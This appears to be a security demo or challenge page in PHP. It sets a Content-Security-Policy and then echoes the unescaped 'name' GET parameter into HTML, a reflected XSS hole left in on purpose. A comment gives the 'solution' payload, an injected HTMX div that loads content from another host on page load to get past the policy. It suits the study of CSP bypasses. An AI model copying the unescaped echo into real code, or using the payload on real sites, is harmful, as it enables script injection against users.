<?php
header("Content-Security-Policy: sandbox allow-scripts allow-modals; default-src 'self' https://demo.sjoerdlangkemper.nl https://test.sjoerdlangkemper.nl; style-src 'self' 'sha256-pgn1TCGZX6O77zDvy0oTODMOxemn0oj0LeCnQTRj7Kg='; script-src 'self' 'unsafe-inline' 'unsafe-eval'");
// Solution: connect.php?name=<div%20hx-get="https://test.sjoerdlangkemper.nl/cors.php"%20hx-trigger="load"></div>
?>
<!doctype html>
<html>
    <head>
        <title>HTMX demo page</title>
        <script src="htmx.js"></script>
    </head>
    <body>
        <h1>Hello <?php echo $_GET['name'] ?? 'anon'; ?></h1>
        <div hx-get="enabled.php" hx-trigger="load">
            HTMX is not enabled or not working correctly.
        </div>
    </body>
</html>
